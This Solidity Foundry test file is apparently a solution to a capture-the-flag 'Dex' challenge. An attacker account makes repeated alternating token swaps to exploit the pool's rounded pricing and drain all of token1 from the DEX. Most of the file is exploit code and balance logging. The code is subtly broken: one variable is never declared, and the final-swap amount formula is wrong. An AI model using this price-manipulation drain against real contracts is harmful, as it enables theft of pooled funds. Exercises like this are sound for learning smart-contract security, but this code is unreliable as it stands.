// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Dex.sol";

contract DexTest is Test {
    SwappableToken public swappabletoken1;
    SwappableToken public swappabletoken2;
    Dex public dex;
    address attacker = makeAddr("attacker");

    function setUp() public {
        dex = new Dex();
        swappabletoken1 = new SwappableToken(address(dex),"Swap","SW", 110);
        vm.label(address(swappabletoken1), "Token 1");
        swappabletoken2 = new SwappableToken(address(dex),"Swap","SW", 110);
        vm.label(address(swappabletoken2), "Token 2");
        dex.setTokens(address(swappabletoken1), address(swappabletoken2));

        dex.approve(address(dex), 100);
        dex.addLiquidity(address(swappabletoken1), 100);
        dex.addLiquidity(address(swappabletoken2), 100);

        vm.label(attacker, "Attacker");
        
        // Set up the attacker with some initial balance
        swappabletoken1.transfer(attacker, 10);
        swappabletoken2.transfer(attacker, 10);
        

        //DO_NOT_TOUCH
    }

    function test_Exploit() public {
        // Execute the attack as the attacker
        vm.startPrank(attacker);
        
        // Approve DEX to spend tokens
        swappabletoken1.approve(address(dex), type(uint256).max);
        swappabletoken2.approve(address(dex), type(uint256).max);
        
        // Perform alternating swaps to drain token1
        // Swap 1: 10 token1 -> ~10 token2
        dex.swap(address(swappabletoken1), address(swappabletoken2), 10);
        console.log("After swap 1:");
        console.log("Attacker token1:", swappabletoken1.balanceOf(attacker));
        console.log("Attacker token2:", swappabletoken2.balanceOf(attacker));
        console.log("DEX token1:", swappabletoken1.balanceOf(address(dex)));
        console.log("DEX token2:", swappabletoken2.balanceOf(address(dex)));
        
        // Swap 2: 20 token2 -> ~24 token1
        dex.swap(address(swappabletoken2), address(swappabletoken1), 20);
        console.log("After swap 2:");
        console.log("Attacker token1:", swappabletoken1.balanceOf(attacker));
        console.log("Attacker token2:", swappabletoken2.balanceOf(attacker));
        console.log("DEX token1:", swappabletoken1.balanceOf(address(dex)));
        console.log("DEX token2:", swappabletoken2.balanceOf(address(dex)));
        
        // Swap 3: 24 token1 -> ~30 token2
        uint256 token1Balance = swappabletoken1.balanceOf(attacker);
        dex.swap(address(swappabletoken1), address(swappabletoken2), token1Balance);
        console.log("After swap 3:");
        console.log("Attacker token1:", swappabletoken1.balanceOf(attacker));
        console.log("Attacker token2:", swappabletoken2.balanceOf(attacker));
        console.log("DEX token1:", swappabletoken1.balanceOf(address(dex)));
        console.log("DEX token2:", swappabletoken2.balanceOf(address(dex)));
        
        // Swap 4: All token2 -> token1
        token2Balance = swappabletoken2.balanceOf(attacker);
        dex.swap(address(swappabletoken2), address(swappabletoken1), token2Balance);
        console.log("After swap 4:");
        console.log("Attacker token1:", swappabletoken1.balanceOf(attacker));
        console.log("Attacker token2:", swappabletoken2.balanceOf(attacker));
        console.log("DEX token1:", swappabletoken1.balanceOf(address(dex)));
        console.log("DEX token2:", swappabletoken2.balanceOf(address(dex)));
        
        // Swap 5: All token1 -> token2
        token1Balance = swappabletoken1.balanceOf(attacker);
        dex.swap(address(swappabletoken1), address(swappabletoken2), token1Balance);
        console.log("After swap 5:");
        console.log("Attacker token1:", swappabletoken1.balanceOf(attacker));
        console.log("Attacker token2:", swappabletoken2.balanceOf(attacker));
        console.log("DEX token1:", swappabletoken1.balanceOf(address(dex)));
        console.log("DEX token2:", swappabletoken2.balanceOf(address(dex)));
        
        // Final swap: Use all token2 to drain remaining token1
        token2Balance = swappabletoken2.balanceOf(attacker);
        // Calculate how much token2 we need to drain all token1
        uint256 dexToken1Balance = swappabletoken1.balanceOf(address(dex));
        uint256 dexToken2Balance = swappabletoken2.balanceOf(address(dex));
        uint256 token2Required = (dexToken1Balance * dexToken2Balance) / dexToken1Balance + 1;
        
        // If we have enough token2, use only what's needed
        // Otherwise use all we have
        uint256 swapAmount = token2Balance;
        if (token2Balance > token2Required && token2Required > 0) {
            swapAmount = token2Required;
        }
        
        dex.swap(address(swappabletoken2), address(swappabletoken1), swapAmount);
        console.log("After final swap:");
        console.log("Attacker token1:", swappabletoken1.balanceOf(attacker));
        console.log("Attacker token2:", swappabletoken2.balanceOf(attacker));
        console.log("DEX token1:", swappabletoken1.balanceOf(address(dex)));
        console.log("DEX token2:", swappabletoken2.balanceOf(address(dex)));
        
        vm.stopPrank();

        is_Drained();
    }

    function is_Drained() internal view {
        console.log('Final balance of dex token 1: ', swappabletoken1.balanceOf(address(dex)));
        console.log('Final balance of dex token 2: ', swappabletoken2.balanceOf(address(dex)));
        require(swappabletoken1.balanceOf(address(dex)) == 0, "Token1 not fully drained");
    }
}
